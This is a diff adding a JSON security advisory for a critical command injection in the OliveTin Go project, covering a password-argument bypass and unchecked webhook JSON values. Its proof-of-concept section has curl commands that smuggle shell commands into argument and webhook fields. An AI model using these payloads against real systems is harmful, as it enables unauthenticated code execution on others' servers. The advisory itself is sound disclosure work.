@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-02-25T16:18:24Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/OliveTin/OliveTin"
+  },
+  "Advisory": {
+    "DatabaseId": 339234,
+    "Id": "GSA_kwCzR0hTQS00OWdtLWhoN3ctd2Z2Zs4ABS0i",
+    "GhsaId": "GHSA-49gm-hh7w-wfvf",
+    "References": [
+      {
+        "Url": "https://github.com/OliveTin/OliveTin/security/advisories/GHSA-49gm-hh7w-wfvf"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27626"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-49gm-hh7w-wfvf"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-49gm-hh7w-wfvf"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-27626"
+      }
+    ],
+    "Description": "### Summary\n\nOliveTin's shell mode safety check (`checkShellArgumentSafety`) blocks several dangerous argument types but not `password`. A user supplying a `password`-typed argument can inject shell metacharacters that execute arbitrary OS commands. A second independent vector allows unauthenticated RCE via webhook-extracted JSON values that skip type safety checks entirely before reaching `sh -c`.\n\n### Details\n\n**Vector 1 — `password` type bypasses shell safety check (PR:L)**\n\n`service/internal/executor/arguments.go` has two gaps:\n\n```go\n// Line 198-199 — TypeSafetyCheck returns nil (no error) for password type\ncase \"password\":\n    return nil  // accepts ANY string including ; | ` $()\n\n// Line 313 — checkShellArgumentSafety blocks dangerous types but not password\nunsafe := map[string]bool{\n    \"url\":                      true,\n    \"email\":                    true,\n    \"raw_string_multiline\":     true,\n    \"very_dangerous_raw_string\": true,\n    // \"password\" is absent — not blocked\n}\n```\n\nShell execution at `service/internal/executor/executor_unix.go:18`:\n```go\nexec.CommandContext(ctx, \"sh\", \"-c\", finalParsedCommand)\n```\n\nA user supplies a `password` argument value of `'; id; echo '` → `sh -c` interprets the shell metacharacters → arbitrary command execution.\n\nThis is not the \"admin already has access\" pattern: OliveTin explicitly enforces an admin/user boundary where admins define commands and users only supply argument values. The `password` type is the documented, intended mechanism for user-supplied sensitive values. The safety check exists precisely to prevent users from escaping this boundary — `password` is the one type it fails to block.\n\n**Vector 2 — Webhook JSON extraction skips TypeSafetyCheck entirely (PR:N)**\n\n`service/internal/executor/handler.go:153-157` extracts arbitrary key-value pairs from webhook JSON payloads and injects them into `ExecutionRequest.Arguments`. These webhook-extracted arguments have no corresponding config-defined `ActionArgument` entry, so `parseActionArguments()` in `arguments.go` finds no type to check against and skips `TypeSafetyCheck` entirely. The values are templated directly into the shell command and passed to `sh -c`.\n\nExample: an admin command template `git pull \u0026\u0026 echo {{ git_message }}` with Shell mode enabled. A webhook POST with `{\"git_message\": \"x; id\"}` injects `id` into the shell command. The webhook endpoint is unauthenticated by default (`authType: none` in default config).\n\n### PoC\n\n```bash\n# Vector 1 — authenticated user with password-type argument\ncurl -X POST http://localhost:1337/api/StartAction \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"actionId\": \"run-command\", \"arguments\": [{\"name\": \"pass\", \"value\": \"'; id; echo '\"}]}'\n\n# Vector 2 — unauthenticated webhook\ncurl -X POST http://localhost:1337/webhook/git-deploy \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"git_message\": \"x; id #\", \"git_author\": \"attacker\"}'\n```\n\nConfirmed on `jamesread/olivetin:latest` (3000.10.0), 3/3 runs. Both vectors produced `uid=1000(olivetin)` output and arbitrary file write to `/tmp/pwned`.\n\n### Impact\n\n- **Vector 1**: Any authenticated user (registration enabled by default, `authType: none` by default) can execute arbitrary OS commands on the OliveTin host with the permissions of the OliveTin process.\n- **Vector 2**: Unauthenticated attacker can achieve the same if the instance receives webhooks from external sources, which is a primary OliveTin use case.\n\nCombined: unauthenticated RCE on any OliveTin instance using Shell mode with webhook-triggered actions.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-25T16:18:22Z",
+    "Severity": "CRITICAL",
+    "Summary": "OliveTin: OS Command Injection via `password` argument type and webhook JSON extraction bypasses shell safety checks",
+    "UpdatedAt": "2026-02-25T16:18:24Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": ""
+      },
+      "VulnerableVersionRange": "\u003c= 0.0.0-20260214204110-d22bdebff7c7"
+    }
+  ]
+}
